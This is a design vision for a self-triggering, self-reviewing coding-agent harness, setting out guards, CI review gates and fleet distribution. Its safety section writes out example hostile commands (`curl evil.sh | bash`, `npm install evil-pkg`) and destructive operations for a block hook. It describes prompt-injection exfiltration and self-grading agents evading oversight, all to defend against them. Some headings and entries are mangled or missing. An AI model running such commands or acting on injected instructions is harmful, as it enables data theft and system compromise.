# V2 Vision — The Autonomous, Self-Improving, Fleet-Scale Harness

> Synthesis of three pillar lenses (`lens-autonomy.md`, `lens-craft.md`, `lens-platform.md`), folded into one coherent world-class vision under the new charter. Every move cites a ground-truth row (§N in `CANONICAL-HARNESS-AS-IS.md`) or a confirmed absence + the re-mine that elevates it. No phantom rebuilds (killlist/E TRULY-WORLD-CLASS items left alone), no rejected-pattern resurrections (killlist/F upheld items stay dead).

---

## The one-paragraph thesis (teach-test)

V1 built the **harness** — every part an agent needs to do one piece of work: 26 skills, 23 specialist agents, isolated worktrees, a 9-pass-plus-4-lens reviewer, a deterministic commit/push floor. What V1 never built is the **loop**: the engine that finds its own work, starts itself, and carries one bug all the way to a reviewed pull request with no human typing anything — and the **floor** that makes switching that loop on *safe*. Today a human is the only thing that can start a run, notice there's work to do, or watch while it runs; that makes the engineer the bottleneck, and no number of parallel agents lifts a ceiling set by one person's attention. Worse, the harness's deepest asset — its review verdict — dies in a gitignored `.cr-ok` file that never reaches CI, so the model effectively grades its own homework and a cloud agent can't even read whether review happened. V2 is five things working together: a **Loop** (a front door that fires on a bug signal, a clock that wakes the agent laptop-closed, and a continuation engine that runs until a *separate grader* says done); a **Floor** (deterministic guards below the model's reach — destructive-command block, credential firewall, egress allowlist, retry ceiling, fleet circuit-breaker, and the keystone: CI re-checking the review verdict on the exact shipped SHA); a **Craft** stack (a reviewer that attacks from isolated context but full project-canon, can say "no, wrong approach," is measured against a labeled defect set, verifies behavior via a runnable spec, and pins money-math with invariants the model cannot weaken); a **Compounding** engine (findings read back into the next run's starting context, recurring findings ratchet into deterministic blocks, drift is detected in both directions on a schedule, and the model-capacity audit runs as a scheduled prune-PR loop); and a **Platform** (the whole thing packaged as a version-pinned plugin + marketplace with a thin `/init` template, canon migrated from Notion into GitHub, and the harness summonable from outside its own process so it travels as canon across 5+ repos and pulls its own fixes down). The teach-test version: *V1 has all the cells but no engine, no clock, and a forgeable finish line; V2 builds the engine, the safety floor that makes the engine safe to start, the quality stack it passes through, the loop that makes it smarter every cycle, and the distribution that makes it travel.*

## The pillars

**1. THE LOOP — the engine that finds, starts, and finishes its own work.** V1 is a pipeline you invoke by hand; a loop runs on a clock and a trigger with no human in the firing position. This pillar is the front door (GitHub label / Slack-Linear summon / CI self-heal each summon an agent), the clock (cloud `/schedule` discovery that fires laptop-closed), the per-task continuation engine (`/goal`, run until a separate grader confirms a verifiable end-state), and the orchestrator (`/lfg`) that chains the existing cells into a deterministic sequence ending in an opened PR. Why: the agent is the cheap, interchangeable *middle* — all the value lives in the two *ends*, trigger quality and review contract, and V1 has a world-class middle with no front door at all.

**2. THE FLOOR — the deterministic safety substrate the loop requires before it can switch on.** Advisory rules hold while a human drives every session; the moment an unattended trigger fires, an advisory rule is a suggestion and a hardcoded guard is the only real control. This pillar is the controls that protect you *after* the model is tricked or simply goes wrong: a destructive-command block, a credential firewall, an egress allowlist, an MCP lethal-trifecta gate, a retry ceiling, a fleet-wide circuit breaker, `disable-model-invocation` on every side-effect skill, and the keystone — CI re-verifying the review verdict on the sentinel'd SHA so "the model agreed with itself" can never be mistaken for "shipped to main." Why: it is cheap, mostly deterministic (safe under `disable-model-invocation`), and it is the entire difference between "autonomy is risky" and "autonomy is bounded."

**3. THE CRAFT — the quality stack the loop passes through, made trustworthy when no human watches.** V1's reviewer is the deepest in the corpus but invisible, un-independent, un-calibrated, advisory, and write-only — at exactly the seams the human used to backstop. This pillar makes the verdict a queryable GitHub artifact, gives the adversarial reviewer isolated solution-context but full project-canon, adds a REJECT tier that kills wrong work, calibrates the reviewer against a labeled defect set on every model bump, wires the governance corpus (ADRs / Rejected Patterns / PITFALLS) in as review criteria, verifies behavior via a runnable spec and a CI-resident evidence bundle, and pins money-math with human-authored property invariants. Why: when agents write most of the code, the bottleneck is no longer writing — it is *checking* — and checking is only as good as its independence, visibility, and calibration.

**4. THE COMPOUNDING ENGINE — the loop that makes the harness smarter every cycle.** V1 has the *write* side (RECURRING-FINDINGS auto-counted) but the read-path is open ("never read by implementers"), the promotion path ends at a human-read doc, there are no effectiveness metrics, the §9 re-audit never runs, and `/scan-context` is canon-referenced but absent while canon cites five phantom artifacts. This pillar closes the read-path into the implementer's task-start context, ratchets recurring findings into deterministic blocks, runs bidirectional drift detection on a schedule, tracks first-pass-approval as a real sensor, and runs the model-capacity deletion engine as a scheduled prune-PR loop with behavioral probes. Why: a fleet across 5+ repos rots *faster* than a solo repo and re-learns the same lesson every night unless the loop actually closes.

**5. THE PLATFORM — the packaging that makes the harness travel as canon across the fleet.** Today the harness lives in exactly one repo plus a drifting Notion shadow; "multi-project" is a goal, not a state. This pillar packages the portable behavior as a version-pinned plugin + marketplace (`/plugin update` = pull), ships a thin `/init` template for the per-repo files a plugin physically cannot carry, migrates canon from Notion into GitHub (making convergence a `git diff`), governs the 15 third-party skills as a supply-chain boundary, exposes the harness as externally-summonable substrate, and runs the context-maintenance loop as a cross-repo cloud routine. Why: the real unit of scale is one engineer running fleets across 5+ repos, and that is impossible while every other repo starts from zero and an improvement in one never reaches the others.

> **Why these five, and why the overlaps resolve here.** The safety floor spans autonomy and platform — it is consolidated into Pillar 2 (THE FLOOR) because every control is the same *kind* of thing (a deterministic guard below the model's reach), and the platform's distribution-specific guards (skill provenance, the worker denylist) are cited there but owned in Pillar 5. The compounding engine spans craft and platform — it is its own Pillar 4 because "get smarter every cycle" is a distinct teachable idea, with its cross-repo distribution mechanics owned in Pillar 5 and its review-quality mechanics owned in Pillar 3. The keystone CI gate (the unforgeable verdict) appears in all three of autonomy/craft/floor lenses; it is owned once, in THE FLOOR (FLOOR-6), and referenced from the others. This is the clearest five-way cut to teach: **find/start/finish · keep-safe · check-well · get-smarter · travel.**

The autonomous trigger front-door trifecta (bug signal → reviewed PR).** *What/why:* a bug appears (error monitor fires, CI goes red, an issue gets a `fix-me` label, someone types `/fix` in Slack) and *that event itself* summons an agent — no human opens a terminal. **Failure prevented:** the agent can build but a human is still the only thing that can *start* it, so the engineer stays the per-repo dispatcher — the exact ceiling autonomy exists to lift. *Mechanism:* three entry types (GitHub label via Action; Slack/Linear `/fix <issue>` summon; CI-failure self-heal with transient-vs-permanent triage), each routing into the existing worktree → `/feature` → `/cr` → `pr.sh` shell unchanged; side-effecting tail gated by `disable-model-invocation` (FLOOR-9); paired with cloud `/schedule` so it fires laptop-closed; ships with the structural review contract (fixed PR template, test-count floor, blast-radius classifier). *Citation:* confirmed absence — §3e (only triggers on disk fire on *human* actions). Elevated by `bug-to-pr-automation.md`, `stripe-minions-kaliski.md`, killlist scale-bias #1/#3/#4 (the #1 wrongly-suppressed idea). *Tag:* **P0 — the spine.** Fires only after FLOOR-1/2/5/6/7/9 are wired.

**L2. `/goal` — the per-task continuation primitive.** *What/why:* a session stops and waits for a human "continue" after every turn; `/goal` lets the agent self-continue until a *fresh, separate* grader confirms a verifiable end-state. **Failure prevented:** the operator babysitting a session with a clean finish line; and versus a naive "loop forever," the working agent rationalizing its own success. *Mechanism:* install `/goal` as a first-class primitive driving a single well-specified reversible `/queue` task; stopping condition must bottom out on real verifiers (MUST-FIX=0, CI green on SHA, diff under cap) plus a turn/time bound — never a prose claim. *Citation:* confirmed absence — `/goal` registered nowhere on disk. Elevated by `goal-loop-primitive.md`, `loop-engineering.md`, killlist C-deferred #2. *Tag:* **P0 — co-sequenced with FLOOR-6 + FLOOR-7,** not blocked behind them (it is the forcing function that makes them mandatory).

**L3. The verifier-rung taxonomy — the standing test for every stop signal.** *What/why:* four ways an agent decides "done," ranked by distance from ground truth: (1) its own confidence; (2) a fresh model reading only the transcript (`/goal`'s grader); (3) a fresh-context reviewer reading the diff and running tools (`/cr`); (4) a CI required-check bound to a sentinel, enforced at merge. **Failure prevented:** trust-laundering — wiring a rung-2 transcript grader and extending it rung-4 ship-permission trust. *Mechanism:* promote the taxonomy to explicit doctrine; standing rule — any stop signal that decides whether work *ships* must bottom out at rung 3 or 4; rung 1/2 may control continuation, never certification. *Citation:* confirmed absence — no verifier-classification doctrine; §3c/§3f canon internally inconsistent on `/cr` verdict. Elevated by `goal-loop-primitive.md` Move 2. *Tag:* **P0 doctrine — designed in lockstep with FLOOR-6.**

**L4. The cloud heartbeat — scheduled self-triggering discovery.** *What/why:* every mechanism fires only when a human starts a session; a loop runs on a clock and surfaces work *we didn't already know about*. **Failure prevented:** the silent death of every "weekly" ritual (in a system with no scheduler a weekly ritual runs twice then never again). *Mechanism:* cloud `/schedule` + `CronCreate` fire a recurring discovery agent (ritual scans, runtime-error surface, ≥3-recurring findings) feeding a *gated action agent* (bug→PR, not a file a human reads on an unscheduled morning); respect the R1 constraint (+98% PRs, zero DORA gain) by producing one scoped, pre-validated PR per finding, never 30 raw triage items. *Citation:* confirmed absence — §3e (rituals trigger only at session start; no cron). Scheduling substrate confirmed present. Elevated by `loop-engineering.md`, killlist C-deferred #3, scale-bias #8/#9. *Tag:* **P0 substrate.**

**L5. The `/lfg` orchestrator — brainstorm→plan→work→review→compound→opened-PR, with the seven-failure-mode guard battery.** *What/why:* we own every *cell* of the idea-to-PR loop but no committed command closes them into a deterministic sequence ending in an opened PR. **Failure prevented:** the "AFK is a someday-feature" trap — the loop never closes and every task still needs a babysitter at each handoff. *Mechanism:* a single `/lfg`-equivalent orchestrator sequencing the existing pieces with no human between steps, ending by calling `scripts/pr.sh`, inside UNATTENDED worktree mode behind the Tier-0 firewall (FLOOR-2), side-effect tail gated by `disable-model-invocation` (FLOOR-9); deterministic seams / agentic cells; built-in guards from day one — structural brainstorm→plan seam (diverge then converge), a routing flag on `/cr` findings (needs-design-decision vs must-fix-now), and the seven-failure-mode guard battery (cross-skill reference-integrity CI check that fails on dangling `@agent`/`/skill` refs — we already carry phantom refs; skill-cache/restart rule; encoding-normalization; agent-stall watchdog; context-drift / non-determinism / compound-timing checks). *Citation:* confirmed absence — §3b (cells exist, no chaining orchestrator); §6 (phantom refs). Elevated by `every-compound-lfg.md` (single biggest move), killlist E #4/#6, scale-bias #20. *Tag:* **P0 — the keystone integration deliverable.** Resolve the `/dev`-vs-`/feature` canonical-driver fork (Fork F8) first so the orchestrator does not bake in a duplication.

### PILLAR 2 — THE FLOOR

**F1. `block-dangerous-bash.sh` — the destructive-operation guard (canon's absent 3rd guard).** *What/why:* a deterministic guard that blocks irreversible shell actions (prod deploys, `rm -rf` outside the worktree, `DROP`/`TRUNCATE`/`DELETE`-without-`WHERE`, destructive `supabase db push`, writes to `.git`/`.husky`/`.claude`) *before they run*. **Failure prevented:** the literal Replit-July-2025 prod-DB deletion and the PocketOS-2026 incident — an unattended agent mid-cascade with no human to stop it. *Mechanism:* a `PreToolUse` Bash hook alongside `block-dangerous-git.sh` / `block-npm-install.sh`, full scope including the FLOOR-4 `supabase db push`-from-worktree block; **fails closed** on a missing dependency (a guard that fails open is "probabilistic enforcement in a costume"). *Citation:* confirmed absence — §3e/§5 ("Canon's 3rd guard — ABSENT"). Elevated by `bug-to-pr-automation.md`, `agent-sandboxing-10co.md` Move 2, killlist E #2, F #4. *Tag:* **P0 — the spine's precondition.** Ships before or with the first trigger.

**F2. Tier-0 credential firewall — promoted to a blocking pre-flight invariant.** *What/why:* the single highest-severity incident class is credential exfiltration needing *no exploit* (Anthropic red-team: 24/25 succeeded); for event-vendor, `.env.local` points at **production** Supabase with the service-role key (full RLS bypass). **Failure prevented:** a misconfigured worktree, a stale shared `.env.local` symlink, or a cloud `/schedule` clone resolving `.env.local` to prod silently re-arms the 24/25 failure mode unwatched. *Mechanism:* harden the existing creation helper into an enforced runtime invariant — a blocking pre-flight hook (same tier as `block-dangerous-git.sh`) that refuses any unattended run whose readable env holds a prod URL/service-role key, gives each `/queue` worker its own isolated env, and gates every autonomy entry-point. *Citation:* §3e/§6 ("partially"). Elevated by `agent-sandboxing-10co.md` Move 1, `anthropic-contains-claude.md`, killlist E #3, scale-bias #10/#16. *Tag:* **P0 — load-bearing for the only failure mode that actually caused incidents.**

**F3. Egress allowlist — the only defense for the prompt-injection supply-chain class.** *What/why:* the credential firewall defeats *exfiltration of a key in the box*; it does nothing against an injected `npm install evil-pkg` or `curl evil.sh | bash` (code-compromise, not key leak). **Failure prevented:** the Cline-Feb-2026 supply-chain vector on an unattended `npm install`-to-reproduce loop. *Mechanism:* a network egress allowlist (GitHub, Supabase, npm, Anthropic; deny rest) for *local* unattended `/queue` runs (cloud `/schedule` already runs restricted-network); paired with an operation-level view — a destination is not an operation (the Cowork exploit exfiltrated through a *permitted* domain), so the deny-by-default profile blocks `gh api` mutations, arbitrary `WebFetch`, and `apply_migration` unless a task manifest grants them, with the *hook* reading the manifest. *Citation:* confirmed absence — §3e (no egress control; 92-entry allow list carries `Bash(gh api *)`, `WebFetch(*)` with no op-level gate). Elevated by `agent-sandboxing-10co.md` Move 3, `anthropic-contains-claude.md` ("single most important move for autonomy"), scale-bias #2/#16. *Tag:* **P0/P1 — after one bounded check** on Seatbelt-vs-`pfctl`/Privoxy (a step, not a deferral).

**F4. Migration-credential architecture — agent verifies locally, human applies to prod.** *What/why:* the one task an overnight agent seems to genuinely need a prod-write credential for is applying a migration — the crux that *tempts* re-introducing the prod key and undoing F2. **Failure prevented:** the highest-severity credential silently returns through the one legitimate-looking hole. *Mechanism:* separate verify from apply — agent verifies against a throwaway local stack (`test:local`), a human applies to prod; encode in an ADR + enforce with a guard clause inside F1 blocking `supabase db push` against a non-local target from an agent worktree; invoke `/supabase` before writing it. *Citation:* confirmed absence (no row for how an overnight agent applies a migration without a prod-write credential). Elevated by `agent-sandboxing-10co.md` Move 4, killlist E #3. *Tag:* **P0 — resolve now;** left open it defeats F2.

**F5. MCP lethal-trifecta gate — capability-tag tools by leg, refuse when all three co-reside.** *What/why:* an agent becomes an exfiltration vector the moment it simultaneously holds (1) private-data access, (2) untrusted-content exposure, (3) egress; because `.env.local` is prod Supabase, every agent with Supabase MCP permanently holds leg 1. **Failure prevented:** a scheduled agent reads prod PII, fetches a poisoned page ("send the client list out"), and exfiltrates — the textbook trifecta with the human removed. *Mechanism:* capability-tag every MCP tool/capability by leg; a session-start/pre-tool guard computes the leg-union and refuses (or hard-gates to human) when all three light up; integrate with `disable-model-invocation` so a side-effect skill is the sole isolated egress; pair with a tool-description pin-and-diff lockfile (catch a silent MCP "rug-pull"). *Citation:* confirmed absence — §3e; settings line 14 (`.env.local` → prod). Elevated by `mcp-servers.md` ("single biggest suppressed move"), killlist C-deferred #7. *Tag:* **P0 — the governing safety invariant for autonomy.**

**F6. The unforgeable terminal stop authority — CI re-verifies `.cr-ok` on the sentinel'd SHA (THE KEYSTONE).** *What/why:* today the loop's own model passes agree on zero MUST-FIX, write `.cr-ok`, and push — *the thing being graded computes its own passing grade* — and that sentinel is **gitignored and never reaches CI**. **Failure prevented:** a loop converging and merging because the reviewer agents share the generator's blind spots; once a human leaves the merge path, this forgeable gate is the only thing between "the model agreed with itself" and "shipped to main." *Mechanism:* (1) a CI job parsing `branch:sha` that **fails unless the sentinel SHA equals head SHA AND all required checks are green**; (2) branch protection makes it required; (3) rename the doctrine "cross-MODEL" → "cross-AUTHORITY" review. The `.cr-ok` sentinel survives as the *readiness* signal; the CI gate becomes the *enforceable boundary*. *Citation:* §3f lines 229–231 (Node 8.5(c): gitignored, never reaches CI). Elevated by `recursive-self-improvement.md` Move 1 ("single most charter-critical move"), `coderabbit.md` Move 1, `goal-loop-primitive.md`, killlist E #1/#2. *Tag:* **P0 — the keystone; hard prerequisite for any unattended push.** Co-sequenced with L2.

**F7. Bounded-loop contract — a hard retry ceiling + defined REJECT/UNATTENDED handoff on every loop.** *What/why:* LLM retries hit diminishing returns and start producing "creative but wrong fixes harder to review than the original problem." **Failure prevented:** an unattended agent spins indefinitely (no human to notice the thrashing) or stops half-done with no one paged. *Mechanism:* a cross-cutting `bounded-loop` contract every primitive inherits — a `MAX_ITERATION` constant (default 2–3, tunable) and a first-class terminal `REJECT`/`NEEDS-HUMAN` state with a defined artifact and paging target; wired into `/cr`'s Opus auto-fix loop, `/debug`, `/refactor`, `/goal`, cloud `/schedule`; on cap-exceeded branch on `UNATTENDED` (re-queue vs page); a REJECT classification with deterministic triggers (scope explosion; diff over a hard ceiling ~800 lines; CI failing with no auto-fix path; auth/schema/payment change with zero/negative test delta; diff solves a different problem than the spec) bounded by a re-queue attempt cap. *Citation:* §3c (disk `/cr` "No REJECT tier, no UNATTENDED branching"). Elevated by `agentic-platform-eng-saul.md` Move 1, `code-review-latentspace.md` Move 1, `stripe-minions-kaliski.md`. *Tag:* **P0 — makes unattended loops survivable.** Principle ships now; the *number* is a tuning call (Fork F3).

**F8. Stop-the-line defect-class circuit breaker — halt the fleet when the same failure repeats.** *What/why:* a retry ceiling bounds *one* loop; stop-the-line bounds the *fleet*. **Failure prevented:** an unattended fleet stacks 20 PRs on a single broken assumption across 5 repos before anyone looks — "the fleet doesn't fail once, it fails twenty times." *Mechanism:* a defect-class halt in the unattended/`/loop`/`/queue`/`/schedule` path — on N repeats of a normalized failure signature, write a stop-the-line marker, stop opening new PRs in that class, page a human; pair with the learned-constraint store (CMP-2) so the root-cause becomes an enforced row. *Citation:* §3c / §3f (nothing halts a *series* of agent PRs). Elevated by `osmani-agent-skills.md` Move 3 ("elite autonomous systems are defined by how cleanly they stop"). *Tag:* **P0 — a precondition for running fleets at all.**

**F9. `disable-model-invocation` across irreversible side-effect skills + the activation-tier audit.** *What/why:* `disable-model-invocation:true` removes a skill from the model's context, making it a safe actuator only a pinned orchestrator step can summon; today **0 of 26 skills** carry any invocation-control frontmatter. **Failure prevented:** an autonomous loop invokes deploy / open-PR / migration-apply on model judgment. *Mechanism:* assign every skill an activation tier; irreversible side-effect skills (open-PR, deploy, send-Slack, migration-apply, `queue`, `setup-strategy` which mutates CLAUDE.md, the `/init` materializer) get `disable-model-invocation:true`; rewrite phrase-keyed descriptions to situational triggers. *Citation:* §3e (0/26 skills carry invocation-control frontmatter). Elevated by killlist E #11, `commands-vs-skills.md` Move 1/2. *Note:* a `deny` in *committed* settings.json is agent-reachable; the truly unbypassable floor is `managed-settings.json`, but *placing* it is a human handoff (no agent edits to guard files). *Tag:* **P0 — the substrate that makes side-effect skills safe.** Co-ships with L1.

### PILLAR 3 — THE CRAFT

**C1. Review verdict as a first-class GitHub artifact + hard CI gate.** *What/why:* `/cr`'s only durable output is the gitignored `.cr-ok`, invisible to CI and the PR; depth on an invisible surface is worthless to a fleet. **Failure prevented:** an autonomous merge on an unverifiable, forgeable "review passed" token. *Mechanism:* `/cr` writes its full verdict (MUST-FIX-resolved, NEEDS-HUMAN, SUGGESTION, REJECT, RECURRING-FINDINGS delta, lens findings) to a structured surface `scripts/pr.sh` posts to the PR; CI parses the sentinel and gates on SHA-match + green checks (this is the PR-facing half of F6 — same plumbing, owned jointly). *Citation:* §3f / Node 8.5(c). Elevated by `coderabbit.md` Move 1, `recursive-self-improvement.md` Move 1. *Tag:* **P0 — bolts onto F6.** Verdict-artifact surface is Fork F1.

**C2. True adversarial independence — fresh sub-agent, isolated solution context, shared project canon, iterative loop.** *What/why:* the strongest *quantified* mechanism in the corpus — Gemini CLI #26397 lifted merge-readiness 43%→91% via cross-context adversarial iteration before any human looked; our 4 lenses run inside the same `/cr` invocation sharing the coder's context. **Failure prevented:** the reviewer inherits the coder's rationalizations and polishes a confidently-wrong solution; *and* the opposite — a canon-blind reviewer re-litigating settled decisions and missing tenant/RLS rules that live in `src/data/`, not the diff. *Mechanism:* provision the adversarial pass with a clean solution context (no coding-session reasoning) but WITH read access to project canon (CLAUDE.md, AGENTS.md, Rejected Patterns, PITFALLS, ADRs); framing inverted to "find what breaks this"; run as the 3-4 round hunt→fix→retest loop bounded by an iteration cap. *Citation:* §3c, §3d. Elevated by `code-review-latentspace.md` Move 2; killlist F #5 ("no shared context" stays dead, the *correct* design elevated). *Tag:* **P0 — the largest evidenced pre-human quality jump.**

**C3. REJECT tier + bounded-retry / UNATTENDED branching.** *(The Craft-side specification of F7's REJECT classification — same deterministic triggers, owned jointly with the Floor.)* *What/why:* `/cr`'s three exits all assume the PR is worth finishing; there is no "wrong approach — close and re-spec." **Failure prevented:** an overnight run ships five polished all-green PRs solving the *wrong problem*, straight to a tired human instead of auto-close-and-re-queue. *Mechanism:* the F7 REJECT classification, surfaced inside `/cr`; REJECT auto-closes and re-queues with a reason (does NOT escalate); bounded — REJECT→re-spec→REJECT twice escalates to Slack/Linear. *Citation:* §3c. Elevated by `code-review-latentspace.md` Move 1, `agentic-platform-eng-saul.md`. *Tag:* **P0.**

**C4. Calibrate the reviewer — golden-set recall, re-run on every model/pass change.** *What/why:* nobody has measured whether `/cr` catches 1-in-5 defects or 4-in-5, and we just swapped Sonnet 4.6 → Opus 4.8 blind. **Failure prevented:** shipping autonomy on a quality gate with an unknown, possibly catastrophic miss rate. *Mechanism:* a `golden-set/` corpus of **adversarially-seeded** labeled diffs (seeded bugs: missing fallback, `as`-without-narrowing, cross-tenant RLS hole, open-redirect) + clean diffs; a `/cr-calibrate` CI job emits recall + false-positive-rate per pass/lens; re-measured on any change to `/cr` passes, the tier-merge rule, or the model; a stale recall blocks promotion of `/cr` as a trusted gate; cap `/queue`/`/schedule` self-merge until recall clears a stated floor. *Doctrine:* a calibrated `/cr` is a *triage* layer, never a *terminal* authority (terminal authority is F6's CI-green-on-SHA). *Citation:* confirmed absence — §6 (`@benchmark-runner` phantom). Elevated by `coderabbit.md` Move 2, `recursive-self-improvement.md` Move 2, `when-is-llm-call-worth-it.md`. *Tag:* **P1 — a hard gate on unattended self-merge;** runs against a curated corpus (promotes now, unlike outcome tracking).

**C5. Wire the governance corpus (ADRs, Rejected Patterns, PITFALLS) into review as criteria.** *What/why:* CodeRabbit's structural blind spot is *memory locality* — it cannot reason over historical design decisions and locked conventions; that is exactly our moat, sitting unused. **Failure prevented:** a reviewer that re-litigates settled decisions or silently lets a PR violate a locked ADR / an RLS role-check (explicitly rejected) / a known PITFALL. *Mechanism:* a dedicated `/cr` lens whose input is `docs/adr/` + AGENTS.md Rejected Patterns + PITFALLS, instructed to flag any hunk contradicting a locked decision and cite the specific ADR/pattern; composes with C2 (the isolated reviewer reads this canon) and CMP-2 (a generated lens criterion *is* an enforcement artifact). *Citation:* §5, §4; confirmed absence (no row wires the corpus as review input). Elevated by `coderabbit.md` Move 3. *Tag:* **P0/P1 — the highest-defensibility move;** converts "a local CodeRabbit" into "a reviewer no SaaS tool can replicate." Wire alongside C2.

**C6. The per-feature behavioral contract — `docs/specs/<feature>.md` with an executable Verification section.** *What/why:* repos hold *code* (how) and *project-context docs* (what this codebase is) but rarely the third thing: "what is THIS feature supposed to do, and how do I know it still does it?" CLAUDE.md *names* `docs/specs/` but it does not exist on disk. **Failure prevented:** behavioral drift — the fifth modification six months later by a stateless cold-start agent silently breaks behavior nobody re-stated. *Mechanism:* a per-feature doc with three required sections — Behavior, Implementation pointers, Verification (executable steps); wire `/feature` to write/update the spec first; ship with an independent review pass on the spec (spec-first has no built-in adversary — do NOT copy self-verification-by-implementer); do NOT absorb into ADRs or developer tests. *Citation:* confirmed absence — §3a, §4. ## What makes V2 DECISIVELY better than V1 (the headline deltas)

Each names the V1 weak version, the world-class form, and the seam where the human used to backstop it (autonomy removes that human, turning each "we have a version" into a live failure surface). These are the five charter-named transformations, with the corpus evidence behind each.

1. **HARNESS → LOOP.** V1 is a pipeline you invoke by hand: `/loop` is a session-bound interval poller, rituals "fire only at session start," there is no `/goal` and no cron — *the harness has no clock,* so every "weekly" ritual ran twice and died. V2 (L1/L2/L4/L5) is a trigger trifecta + cloud heartbeat + `/goal` + the `/lfg` orchestrator that closes idea→reviewed-PR with no human between steps. *The unscheduled / no-front-door / no-orchestrator seams.* (killlist E #4/#6, scale-bias #1/#20.)

2. **ADVISORY → DETERMINISTIC.** V1 is "overwhelmingly advisory": `block-dangerous-bash.sh` is ABSENT, two guards fail *open* on missing `jq`, the firewall is a creation convenience, 0/26 skills are invocation-gated. V2 (F1/F2/F3/F9) is the absent 3rd guard built fail-closed at full scope, the firewall as a blocking pre-flight invariant, an egress allowlist, and `disable-model-invocation` on every side-effect skill. *The advisory seam — and the credential seam, the only failure mode that actually caused incidents (24/25).*

3. **INVISIBLE → VISIBLE VERDICT.** V1's `.cr-ok` sentinel is gitignored and **never reaches CI** — the terminal stop authority is forgeable, the model grades its own homework, and a cloud agent can't even read whether review happened. V2 (F6/C1) makes "done" require MUST-FIX=0 AND CI-green-on-SHA enforced in branch protection where the loop cannot forge it, with the verdict posted as a queryable GitHub artifact. *The invisible seam — the keystone of the whole vision.* (killlist E #1/#2.)

4. **UNSCHEDULED → CLOCKED.** V1 has no scheduler, so noticing work was nobody's job — drift, recurring-finding accumulation, and the §9 re-audit never get *noticed*. V2 (L4/CMP4/CMP6/P9) runs discovery, bidirectional context-drift detection, and the model-capacity prune-loop on a cloud clock laptop-closed, each producing review-cheap output (one scoped PR per finding, never 30 raw triage items). *The unscheduled seam, resolved by the now-proven cloud `/schedule`.*

5. **SINGLE-PROJECT → FLEET-CANON.** V1 lives in exactly one repo plus a drifting Notion shadow; "multi-project" is a goal not a state, the install method is "reconstruct from a Notion page," and an improvement in one repo never reaches the others. V2 (P1/P2/P3/P8/P9) is a version-pinned plugin + marketplace with `/plugin update` as the native pull path, a thin `/init` template for what a plugin can't carry, GitHub canon (convergence = `git diff`), push-back-up promotion, and a cross-repo context loop. *The undistributed seam.*

> Sixth, spanning all five: **WRITE-ONLY → COMPOUNDING.** V1 writes RECURRING-FINDINGS and "never reads it back"; promotion ends at a human-read doc; no metrics; the §9 re-audit never runs. V2 (CMP1-CMP6) closes the read-path into task-start context, ratchets recurring findings into deterministic blocks, tracks first-pass-approval as a sensor, and runs the prune-loop on a schedule — the self-improving loop the charter names first-class, finally closing.

## The autonomy program in build order

The non-negotiable ordering principle: **no trigger fires until the floor it rides on is wired.** The floor is cheap, mostly deterministic, and is the difference between "autonomy is risky" and "autonomy is bounded." Each trigger names the safety companions it requires.

**Phase 0 — THE FLOOR (build first; the precondition).** All P0, mostly deterministic, safe under `disable-model-invocation`:
- **F1** destructive-command block (fail-closed) · **F2** credential firewall (blocking pre-flight) · **F4** migration verify-local/apply-human (a guard clause inside F1) · **F5** MCP lethal-trifecta gate · **F9** `disable-model-invocation` on every side-effect skill · **F3** egress allowlist (after one bounded Seatbelt-vs-proxy check) · **F7** bounded-loop contract + REJECT/UNATTENDED · **F8** stop-the-line circuit breaker.
- **F6** the unforgeable CI verdict gate (the keystone) + **C1** verdict-as-GitHub-artifact (same plumbing) — co-sequenced with L2 below, which is the forcing function that makes them mandatory.
- One-time precondition: **C13/P10** re-audit every reasoning sub-agent's `model:` on Opus 4.8 *before* trusting the review stack under autonomy.

**Phase 1 — THE SPINE (build on the floor).** The continuation engine and orchestrator, then the front door:
- **L2** `/goal` (co-sequenced with F6 + F7) + **L3** verifier-rung doctrine (designed in lockstep with F6).
- **L4** the cloud heartbeat (the wire that makes a harness a loop) + **L5** the `/lfg` orchestrator with the seven-failure-mode guard battery (resolve the `/dev`-vs-`/feature` canonical-driver fork F8 first).
- **L1** the trigger trifecta (GitHub label / Slack-Linear summon / CI self-heal) — *fires only after F1/F2/F5/F6/F7/F9 are wired,* with the structural review contract (PR template + test-count floor + blast-radius classifier).
  - **Named safety companions L1 requires:** F1 (destructive-block), F2 (credential firewall), F5 (trifecta gate), F6 (unforgeable verdict), F7 (bounded-loop), F9 (side-effect skills removed from invocation), and the side-effecting tail as a `disable-model-invocation` skill.

**Phase 1.5 — THE COMPOUNDING SUBSTRATE (parallel with the spine; feeds it).** Mostly P0:
- **CMP1** read-path close + **CMP2** finding→enforcement ratchet + **CMP3** effectiveness-metrics ledger + **CMP4** `/scan-context` bidirectional drift + decay. These make the loop's output review-cheap and self-correcting.

**Phase 2 — THE QUALITY UPGRADES (after the floor + spine).** P1, each gated on a Phase-0/1 control:
- **C2** adversarial independence + **C5** governance-corpus lens (wire together) · **C6/C7** the spec layer + spec-verification gate · **C4** reviewer calibration (the hard gate on unattended self-merge) · **C11** money-math PBT (after F6 + C4; the install is Fork F6) · **C8/C9/C10** the `/verify` render gate + agent-legible markup + evidence bundle.
- **LOOP-7 / A6 — deterministic risk-based auto-approval (Ona L4):** classify LOW/MEDIUM/HIGH off paths + diff-size + test-delta + scope; LOW auto-approves into the F6 CI floor (auto-approve ≠ auto-merge — the agent is never the last gate), MEDIUM → `/cr`, HIGH → `/cr-security` + human. **Named safety companions:** F6 (the deterministic last gate beneath it), C4 (recall measured + above a floor), CMP3 (the per-task-type signal), and the agent-PR observability log (below). Ships in *observe-only* mode first if Fork F2 chooses conservatism.
- **The agent-PR observability log** (promote `permission-logger.sh` into an append-only forensic PR-outcome feed) — the prerequisite observability for auto-approval; you cannot safely auto-approve without it.

**Phase 3 — THE DISTRIBUTION (gated on canon↔disk convergence as the publish gate).** Building the packaging proceeds in parallel; *publishing* waits on convergence:
- **P3** Notion→GitHub canon migration (makes convergence a `git diff`) · **P6/P7** the manifest + disposition policy · **P1/P2** plugin + marketplace + thin `/init` (built after convergence) · **P5** skill-provenance governance · **P4** MCP-as-substrate (the distribution half of L1) · **P9** the cross-repo context loop (P0 detection now; P1 repair-worker gated on the guard-file denylist) · **P8** push-back-up (human-gated now; automation GATED on a 2nd repo) · **P10** the roster as portable roles.

**Phase 4 — THE SELF-IMPROVING UPGRADES (after volume exists).** P1 / GATED:
- **CMP5** session-end capture trigger · **CMP6** the §9 prune-PR loop with behavioral probes (the safety interlock for the de-scaffolding program).

## Honest UPHELD-CUTS and STILL-GATED items

